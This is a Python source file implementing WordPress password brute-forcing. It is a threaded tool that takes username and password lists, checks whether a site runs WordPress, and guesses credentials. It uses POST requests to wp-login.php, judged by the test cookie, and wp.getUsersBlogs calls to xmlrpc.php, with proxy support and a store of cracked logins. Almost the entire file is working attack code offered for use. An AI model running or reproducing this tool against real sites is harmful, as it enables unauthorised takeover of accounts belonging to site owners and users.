# Nethanel Gelernter (c)
import threading
from Lib.queue import Queue as BlockingQueue
from concurrent.futures.thread import ThreadPoolExecutor
from wordpress.wplogs import WPLogs
from wordpress.wpdetector import WPDetector
from wordpress.wpenumerator import WPEnumerator
from http_handler.request_handler import HTTPWithSession
import xmltodict


_DEFAULT_TUPLE_INDEX = 0
_DEFAULT_DICT_COOKIE = 'set-cookie'
_SUCCESS = 'httponly'
_NUM_OF_THREADS = 1
_SHUT_DOWN_KEY = -1
_ERROR_MSG = "Error"
_ERROR_LIMIT = 10
_WP_ADMIN = "/wp-login.php"
_TEST_COOKIE = "wordpress_test_cookie=WP+Cookie+check"


class WPPassBruteforcer(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        '''
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain:
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        '''
        self._url = str(domain)
        self._additional_data = additional_data
        self._proxies = proxies
        self._errors = 0  # should make volatile var
        self._logs = WPLogs()
        self._wp_admin_url = str(domain+str(_WP_ADMIN)).replace("//"+str(_WP_ADMIN), "/"+str(_WP_ADMIN))
        self._cracked_data = dict()
        self._passwords = set()
        self._username_q = BlockingQueue()
        self._detector = WPDetector(self._url, proxies)
        self._enumerator = WPEnumerator(self._url, proxies=proxies)
        self._http = HTTPWithSession()


    def bruteforce(self, usernames, passwords, threads=None, proxies=None):
        '''
        Consider adding progress logging by adding additional parameters
        :param usernames:
        :param passwords:
        :param threads: Number of threads to use
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: dictionary of username to successfully bruteforced password
        '''
        if proxies is not None:
            self._proxies = proxies
        if threads <= 0:
            threads = 1
        executor = ThreadPoolExecutor(max_workers=threads)
        active_threads = threading.active_count()
        try:
            self._errors = 0
            self._insert_username_queue(username_list=usernames)
            self._passwords = set(passwords)
            if threads > 0:
                for i in range(0, threads):
                    executor.submit(self._run())
        except Exception as e:
            self._save_log(e, "Error: executor has crushed, threads created: "+str((threading.active_count()-active_threads)))
        finally:
            if threading.active_count()-active_threads > 0:
                executor.shutdown(wait=True)
            self._is_errors_exceeded_the_limit(True)
            return self.get_cracked_data()

    def get_cracked_data(self):
        '''
        dictionary of username to successfully bruteforced password
        :return:
        '''
        return self._cracked_data

    def is_method_possible(self):
        '''
        Returns whether the method that is implemented in the class is possible for the domain or not
        :return:
        '''
        try:
            is_data_available = len(self._cracked_data.items()) > 0
            if is_data_available is True:
                return True
            is_wp = self._detector.detect(self._url)
            is_en_wp = self._enumerator.is_enumeration_possible()
            is_errors_limit = self._is_errors_exceeded_the_limit(False)
            if (is_wp or is_en_wp) and is_errors_limit is False:
                return self._test_possibility()
        except Exception as e:
            self._save_log(e, "Error: could not test if brute force is possible on this site: "+str(self._url))
            return False

    def _try(self, username, password):
        raise NotImplementedError()

    def _test_possibility(self):
        raise NotImplementedError()

    def _save(self, username, password):
        try:
            self._cracked_data[username] = password
        except Exception as e:
            self._save_log(e, "Error: save cracked user_name & pass failed for "+str(username)+":"+str(password))

    def _save_log(self, exception, message=None):
        try:
            self._logs.save_log(exception)
            if message is not None:
                self._logs.save_log(message)
                print(message)
        except Exception as e:
            print("Error: saving log is failed, "+str(e))
            
    def _insert_username_queue(self, username_list=None, single=None):
        try:
            if username_list is not None:
                for usr in username_list:
                    self._username_q.put(usr)
            if single is not None:
                self._username_q.put(username_list)
        except Exception as e:
            self._save_log(e, "Error: cannot put to the username_q")
            
    def _run(self):
        try:
            while not self._username_q.empty():
                if self._is_errors_exceeded_the_limit(False) is True:
                    break
                username = self._username_q.get(block=False)
                check_if_cracked = self._is_cracked(username)
                if check_if_cracked is not False:
                    if self._try(username, check_if_cracked) is True:
                        continue
                self._crack(username, self._passwords)
        except Exception as e:
            self._save_log(e, "Error: Thread (" + str(threading.current_thread().getName()) + ") has crushed.")

    def _crack(self, username, passwords):
        try:
            if self._is_cracked(username) is True:
                return None
            for pwd in passwords:
                if self._is_errors_exceeded_the_limit(False) is True:
                    return _ERROR_MSG
                res = self._try(username, pwd)
                if res is True:
                    self._save(username, pwd)
                    print("Cracked: "+str(username)+": "+str(pwd))
                    return None
                elif res is _ERROR_MSG:
                    print("Could not reach the login page or the site cookies: "+str(username)+": "+str(pwd))
                    self._errors += 1
        except Exception as e:
            self._save_log(e, "Error: _crack method crashed for username: "+str(username))

    def _is_cracked(self, username):
        try:
            res = self._cracked_data[username]
            return res
        except:
            return False

    def _is_errors_exceeded_the_limit(self, print_error=False):
        result = False
        if self._errors >= _ERROR_LIMIT:
            result = True
            if print_error is True:
                print("The number of errors has exceeded the limit, please check the parameters given"
                      " - they probably do not allow strong force for this site.")
        return result

    # Feel free to add public method that you consider to be relevant for the users
    # user _ and __ for private and protected methods that should not be used outside the class


class WPLoginPageBruteforcer(WPPassBruteforcer):

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)

    def bruteforce(self, usernames, passwords, threads=_NUM_OF_THREADS, proxies=None, testmode=False):
        if testmode is False and self.is_method_possible() is False:
            return self._cracked_data  # brute force is not possible.
        return super().bruteforce(usernames,passwords,threads,proxies)

    def _try(self, username, password):
        try:
            headers = {'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie': _TEST_COOKIE}
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1' }
            response = self._http.request(url=self._wp_admin_url, method="POST", params=parameters, headers=headers,
                                          proxies=self._proxies)
            if response is None:
                return _ERROR_MSG
            elif _TEST_COOKIE not in str(response.cookies):
                return True
        except Exception as e:
            self._save_log(e, "Error: brute force failed for "+str(username)+":"+str(password))
            return _ERROR_MSG
        return False

    def _test_possibility(self):
        try:
            usernames = list()
            passwords = list()
            passwords.append("123")
            for i in range(0, _ERROR_LIMIT+1):
                usernames.append(str(i))
            self.bruteforce(usernames=usernames, passwords=passwords, threads=0,testmode=True)
            return not self._is_errors_exceeded_the_limit(False)
        except Exception as e:
            self._save_log(e, "Error: could not test possibility on this site: "+str(self._wp_admin_url))
            return False


class WPXmlrpcBruteforcer(WPLoginPageBruteforcer):

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)
        self._wp_admin_url = self._url + "/xmlrpc.php"

    def _try(self, username, password):
        try:
            params = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>"\
                     + str(username)+"</value></param><param><value>" + str(password)\
                     + "</value></param></params></methodCall>"
            headers = {'Content-Type': 'application/xml'}  # set what your server accepts
            response = self._http.request(url=self._wp_admin_url, method="POST", params=params, headers=headers,
                                          proxies=self._proxies)
            if response is None:
                return _ERROR_MSG
            data = xmltodict.parse(response.text)
            try:
                isconnected = data['methodResponse']['params']  # if crashed => connecting failed.
                return True
            except:
                return False
        except Exception as e:
            self._save_log(e, "Error: brute force failed for "+str(username)+":"+str(password))
            return _ERROR_MSG


